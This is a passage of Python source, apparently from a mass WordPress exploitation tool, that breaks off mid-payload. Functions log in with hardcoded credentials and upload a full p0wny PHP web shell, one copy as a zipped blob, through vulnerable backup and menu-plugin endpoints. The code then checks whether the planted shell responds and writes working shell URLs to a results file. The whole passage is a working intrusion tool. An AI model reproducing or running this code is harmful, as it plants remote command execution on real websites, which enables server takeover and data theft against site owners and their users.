_|<span></span>\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\n|_|                         |___/  \\____/                                  <span></span>\n                </div>\n            </pre>\n            <div id=\"shell-input\">\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\n                <div>\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\n                </div>\n            </div>\n        </div>\n    </body>\n\n</html>\n\r\n-----------------------------29650037893637916779865254589\r\nContent-Disposition: form-data; name=\"mec-ix-action\"\r\n\r\nimport-start-bookings\r\n-----------------------------29650037893637916779865254589--\r\n"

        # Exploit
        session.post(exploit_url, headers=header, data=body, timeout=20, verify=False)
        shell = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-content/uploads/shell.php'
        check = requests.get(shell, headers=ua, timeout=10, verify=False).text
        if "<title>p0wny@shell:~#" in check:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #6 -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"{shell}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #6 -->> {red}Failed Exploit !")
    except:pass

def WpEx7(domain):
    try:
        target_ip = domain
        target_port = "80"
        wp_path = "/wordpess/"
        username = "AXVTECH666"
        password = "AXVTECH666PASS@#"

        session = requests.Session()
        auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'

        # Header:
        header = {
            'Host': target_ip,
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'http://' + target_ip,
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1'
        }

        # Body:
        body = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'testcookie': '1'
        }

        # Authenticate:
        auth = session.post(auth_url, headers=header, data=body, timeout=20, verify=False)
        auth_header = auth.headers['Set-Cookie']

        token_url = "http://" + target_ip + ':' + target_port + wp_path + '/wp-admin/admin.php?page=backup_guard_backups'

        # Header (Token):
        header = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Referer": "http://" + target_ip + ':' + target_port + wp_path + '/wp-admin/users.php',
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1"
        }

        # Get Token:
        token_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-admin/admin.php?page=backup_guard_backups'
        init_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-admin/index.php'
        init_request = session.get(init_url).text
        token_request = session.get(token_url).text
        token_start_in = token_request.find('&token=')
        token_start_in = token_request[token_start_in + 7:]
        token = token_start_in[:token_start_in.find('"')]
        exploit_url = "http://" + target_ip + ':' + target_port + wp_path + 'wp-admin/admin-ajax.php?action=backup_guard_importBackup&token=' + token

        # Header (Exploit):
        header = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Referer": 'http://' + target_ip + ':' + target_port + wp_path + 'wp-admin/admin.php?page=backup_guard_backups',
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "multipart/form-data; boundary=---------------------------17366980624047956771255332862",
            "Origin": 'http://' + target_ip,
            "Connection": "close"
        }

        # Body (Exploit): Using p0wny shell: https://github.com/flozz/p0wny-shell
        body = "-----------------------------17366980624047956771255332862\r\nContent-Disposition: form-data; name=\"files[]\"; filename=\"shell.php\"\r\nContent-Type: image/png\r\n\r\n<?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" => $stdout,\n        \"cwd\" => getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => array('File not found / no read permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        return array(\n            'name' => basename($filePath),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => array('Invalid path / no write permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => array('Done.'),\n            'cwd' => getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?><!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <style>\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt > span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input > label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        </style>\n\n        <script>\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length <= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length > 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&/g, \"&amp;\")\n                    .replace(/</g, \"&lt;\")\n                    .replace(/>/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition > 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition >= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        </script>\n    </head>\n\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _   <span></span>\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\n|_|                         |___/  \\____/                                  <span></span>\n                </div>\n            </pre>\n            <div id=\"shell-input\">\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\n                <div>\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\n                </div>\n            </div>\n        </div>\n    </body>\n\n</html>\n\r\n-----------------------------17366980624047956771255332862--\r\n"


        session.post(exploit_url, headers=header, data=body, timeout=20, verify=False)
        shell = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-content/uploads/backup-guard/shell.php'
        check = requests.get(shell, headers=ua, timeout=10, verify=False).text
        if "<title>p0wny@shell:~#" in check:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #7 -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"{shell}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #7 -->> {red}Failed Exploit !")
    except:pass

def WpEx8(domain):
    try:
        target_ip = domain
        target_port = "80"
        wp_path = "/wordpress/"
        username = "axvtech666"
        password = "axvtech666pass@#"

        session = requests.Session()
        auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'

        # Header:
        header = {
            'Host': target_ip,
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'http://' + target_ip,
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1'
        }

        # Body:
        body = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'testcookie': '1'
        }

        # Authenticate:
        auth = session.post(auth_url, headers=header, data=body, verify=False, timeout=20)
        auth_header = auth.headers['Set-Cookie']

        exploit_url = "http://" + target_ip + ':' + target_port + wp_path + 'wp-admin/admin-post.php'

        # Header (Exploit):
        header = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Accept": "application/json",
            "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Referer": "http://" + target_ip + ':' + target_port + wp_path + 'wp-admin/edit.php?post_type=rmp_menu&page=themes',
            "Cache-Control": "no-cache",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "multipart/form-data; boundary=---------------------------12473561203192832341566500492",
            "Origin": "http://" + target_ip,
            "Connection": "close"
        }

        # Exploit Payload (Using p0wny shell: https://github.com/flozz/p0wny-shell)
        body = "-----------------------------12473561203192832341566500492\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nrmp_upload_theme_file\r\n-----------------------------12473561203192832341566500492\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.zip\"\r\nContent-Type: application/zip\r\n\r\nPK\x03\x04\x14\x00\x08\x00\x08\x00\xef\xbb\xb9R\x00\x00\x00\x00\x00\x00\x00\x00TB\x00\x00\t\x00 \x00shell.phpUT\r\x00\x07\xb3l\xad`-\xe2\xe2`\xb3l\xad`ux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00\xc5\x1b\xffz\xdb\xb6\xf1?\x05\xcax\x11\xd5H\xa4l\xd7I+[r\x13\xdbY\xd2\xb9M\x16;\xdd\xf6Y\x9eF\x91\x90\xc4\x9a\"9\x92\xb2\xecU\xee\xb7\xa7\xd9\x83\xedIv\x07\x80\x14H\x82\x94\x94d\x1b\xd3J\"p\xb8\xdf8\x1c\x0e\xf0\xf1I8\rwv\xc6s\xdfN\xdc\xc0'cj%\xf3\x88^N\xa9\xe7\xe9\xbb\xf6\xcci\x91]{\xe14\xc9\xaf;\x04\x9e\xdd8q\x82yBz\xc4\x8a\"\xebAo\x1e\xed\xb0vwL\xf40\xa2\x93\xe1\xccJ\xec\xa9\xae\x99\x1d\xc4_\xdb\x0e|\xec\x9a\x1a\xa2\x989\xcd\x14\x07>\xa6IB+\x8e\xd9\xfb#\xa1^L+1<\xd3\x8dgM\xf8\xad\xef\xf7\x9f\xee5O\xd4\xf8\xec\xa9\xe3F:\xe3\xf4(k\xac@w\r?o\x94(\xe1\x93\x81K8\x04b\xd6|\xbdw#zjXv\x82\x85\xef\x05\x16R\xe2\x84\xbe\x0c\xeb\x12\xda\xed\x04\x88(\xd83\xb3\xeb\x99@S!\xd1:\xb6\xe8=\xb5S\xaf\xe0\x9e\x90\x0e\xe7n \x88q\xdf\xc8Fi\x1cT#\xbd~:\xac\xb5\xea\x04\n\xacgB\x13\xf8\xa97Y\x0f\xa0},{\xe5{\xec\x17<\xe6H\x95\x90\xa8\xc7\xbfq\xfdD\xdf\x1d\xbb\x1e\xfd\xc9\x9aQ\xee\xd9\xf0\x99<\x844E[\x12\x1b\x8d\xcc H\xafG\x1a zC6\x1e\xea\x02&\x83f\x07\xb3pB}\xd2\xb6I\x86_\xab\xd0li\xcc\xb8<fG\x064G\xaeo\x8e\xacx\x8a\xe8\x07\x1a6\x0f4\x01\xc9F\xc6\x00E\xefC/p\xa8\xae\r|p\x86\x18\xe7\xef03WS\x08\xa3\xb6O\x83\xe1h0\xf3\xb0\x9f\xad\x1a\x1b\xac<\x08A\xdf[\xc94\x8b\r\xd8\x00\x9c|\x8f\xdfC\xb0\xc4\xd0\x0e\xfc\x84\xfaI,\xc1JJ\xe5\xe0\xa0\xd5\xd7//.\xcfe\xad\xaa\xd9d\xacr\xf7a\xbc\xf2\xee\xc6kD\xe3\x07\t\x19\x07s\xdf!&\xfc\x06\x04\x96CB\x1a\xcd\xdc8\x06\xde\x8dF\xb3\x95G\x03\xf6m\x94\x9cN\x08\xad4Z\rK>\xd8\x8d!\x03\x13Q|\x91\xc4-\x90\xc5\xf6\x0c\xf4\xf97C\xea\xdbh3\x06_\xe6A\xa5\xfe\x8f!W~\x08\xd8[\\\xe5\xf9\x08]r\xe0\xdd1\xb3I\x10R?\x1d\xd6X\x8c\x1a9K|\x013\xbc\xf5\xef,\xcf\x05\xad\x03\x05n\x84E\xe4&\xf4\xcbZa\xccp\x02\xc3\xadT\x83\x0e\x954(E\xaa\xb1\xed\x051\xb6\x97C\xe1f\xf2\x9c\x05>\xfd\x04\x8e\xd1f\xa8S\x10\x99B\xac\x19\xfe\xfe\xfc\xeaZ\x13\xb6\xd3nX\xe0\xe7V\x89h\x1c\x06~\x8c\x13\xe6\xa7\x8f\x17\x17b\x1d\x8d\x17.\x84eR\x1e(Gf\x90\x1cb*\xcep\xad\x9bcO\x04\x8c\xdd\xe1\xfbw\x97W\xd7,X\xdd\x1c\xe5 \x90\xb5\xaf\xa4\xc5\xa5a\xee\xf7\xcd\x86bU\xca\xa14 \xf2\x11\\j\x1ayl\x8fy\xea\x92H\xaa4\x82s\xc5B\xf5M3\x8fh\x04\x13\xf6\xf6\xa8 a\x08\x80\xddu\x14\xd8\x92\xb0\x01\xb2)\x84\xfe\xf5\xd8\xf8\x02!\xd4\x87.\xc5\xe6\xf6Mk\xa5R\xb0\xbf\xf4\x8a\xebBc\x13a\x1as6o\x1bk9H\xe7\xb7 \x80\xb3I&\xc8\x02H\x91\x9f\xfc\x1a<\x85\xd8G#];\xe5\xc1\xb7}\x05<v\x89\x15\x86\x9ek[\x18J\xcc_\xe2\xc0\xd7\xc4 jO\x03\x82\rY,Jy\x12\x00\x8eKu\xbe\x12\x9c\xf4\x8f\xbf:{wz\xf5\x97\xf7\xe7d\x9a\xcc\xbc\xfe\xce\xce\xb1\xf8F\xc0c$\xdc\xcf\xe4;\x9e\xd1\xc4\x82hdE0\x11z\xda\xc7\xab\xd7\xedo5bJ\x00\x89\x9bx\xb4\x1fv\x16\xfe\xc3\xf7\xcc\x9b\xbb\xbf=96yk\x01\r\x9a\xa1\xa7\xdd\xb9t\x11\x06\x11$\x12ba\xe9i\x0b\xd7I\xa6=\x87\xde\xb96m\xb3\x97\x16q}7q-\xaf\x1d\xdb\x96G{{F'O6N\x1ed\x02Le \x05D\x94\xc0yP\xcc\x80\x99\x15M\\\xbfK:G\xa5\xae\xd0r\x1c\xd7\x9f(\xfbF\x96};\x89pI\xea\x92'\x07\x07\x07e\x08;\xf0\x82\x08:)\xa5\xe5\xce1H\xd8\x1e[3\xd7{\xe8\x92Y\xe0\x07qh\xd9\xb48\xfdr\xaf_w\xbb\xed\x05\x1d\xdd\xba\t\x88\x1e\x05\x9e7\xb2\xa2v\x12\x01\x1f\n\xa9FA\x04^\xd2\x8e,\xc7\x9d\xc7]\xf2mx_'B;\xe5\xf5\xe0\x10\xffm\xcd\x86\x82\x01f\xac\n\xc2S\xeaN\xa6\x89\xa2s#\x89\xa7\xf3\xd9\xe8\x13%N\xb1\x8d\x82\xfbv<\xb5 \xe9\xee\x82;\x81\x03\x93\x0e\xfc{\x1e\xde\x93h2\xb2\xf4N\x0b\xff\x19\x07\xcd\x8dt6\xb2\xf1_\xad O\x98\xff\xab\x98\x96\xbdh\xbfLpf\xdd\xb7S]v:*\xa1R\x07>\x84^b\xcd\x93\x00D\xc1/\x05\xf3\x92\xd8(\xf0\xe1J`\xc2\xffS\xca\xcc|5v\xff\x01af\xaf\x13&e\x00\xc7\x8dC\xcf\x02G\x1e{T\xc1 \xb6\xb6!k\xa1,\xd3\xe9\xe2\xc4\x98\xcf\xfc2\x1c\xe4\x17\x13\xbf\r\t\xc0\x0c\xec\x17'\xb0\x9c\xdb\xd3\r\xd4\xda\x16\xd1B\xa1\xde\xd4\xd1\x0e\xd5\x9a\x0b\xeeh4\xf6P\x1bj}e\xf3\xffP5z1\x05V\xdbl\xdevqC\xd7^DVX!=\xd8\x18\xa8\xecm\"\x8d\x17L\x02\x85(\xcc\x08\x0b!\xcf(\xf0\x9c\xea\x80\xf3\xfa\xf57{\xdf*BVB\xef\x936S2\xd8\x00\x14F\xa3Z~\xbe\x9fQ\xc7\xb5\x88.y\xe0w\xdf\xed\x85\xf7\xaa4\xa2\x9e\xf7\x8c\xeeD\xcfU\xda\xc4'\xf5\xe4\xf6>z\xa6B\x82\x02\x87\xf8\xacb{\xabz\x9a1@\xa1\xbb\xbdN\xe7wj\xf2B\xc8j\x00I\x13>\xa4\x8f\x1b\xf1W\xcb\x13\x17\xb8\x9d\x04\xa1r\x8dy\xdc\xd2</\x9e\xbf\xa85\x8f\xeb\x87s\xd54\xc1g\xd3I\xba-O\x07\xfb\x9d/\xe02\xca\tX\xcb\x8a\xc1\xd1\x87\x11\xec\xc2U2o1\x9f^\x1c\x9e\xbd\xee\xbc\xaa\x9d+yj}\x02Q\xc1W\x10M1\xee\xbd:\xfd\xee\xfc\xc5&\xd1\xa0\xcadkBn>\xd2\xb7\xf7p:m\x12\xea\xc5\"\xca\x1c\x92\x81\xef\x1f\x1e\xb6\xc8\xea\xc3\xe8\x1c6I\x1c\xe0Fpo\xcd\xe2\x9d\x13\xa0O<kDU\xd3@\n\x8f\x8a\x19\x90\x899\xf2\x02\xfb\xb6\xdc\xbf\xca\xd0\xd4.\x92N\xfa\x03e\xfc\xf7\\\x9f\xb6\xabA\xea\x04J\x97\x1e\xd8=U/;\x9fD\x15\x1fn\x86\xaa(#'\r\x90\xff\xf9\xe0l\x11\x84\xf3\xffB\x06\x9a\xc1\xd5\xad\xfe\xb5a\x93\xaf\xe91\xf5\xc6\x1b\xad99\x1d;\xee]\xbd\xc3\xecU\xd1\xdb>\x87\xe0\x14\xabf[0O\xd0j*\x83\xac\x82\xd0\xb1)\xb6\x1e\xd2^\xc4\x8e\xdc0\xc9oF\xee ]>\xfd\xd3\x19l\t\xfd\xb9\xe7\x1d\x95\xfa\xec`6\xb3|\xe7\x8d\x1b'A\xf4\x00`\xd77e\xa0)\xef}\x1f\xc4.\xab\x1e\xf5\x8a\x93\x07\x81\xf8\xf6\xfct\xe6\xbcebU\x11\x14`\"\x89J\xa1r`Y\x95j\x88\xd9r\x94\x9cr\x1eu\xc1\xab*\xbc\xe7\xb0\x1a\xae\xef\xd3\xe8\xcd\xd5\x8f\x17\xe4Y\x8fh\x03\xe0ke\xdb\xd5\x0ci\x1c\xb3\x88j{V\x1c\xf7\x06\x9a\x1cm\x07Z\xbfA\x9e\x91\t\xf5\xdf\xb3w\x1d\x94\xdb\x84\x86\x06\xd8\x03\xc6\xf4Ic+J\x14\xb6\x95!}\x03YE&\xddV\xe3\xb5\rD\xe3\x9b\x99\xab 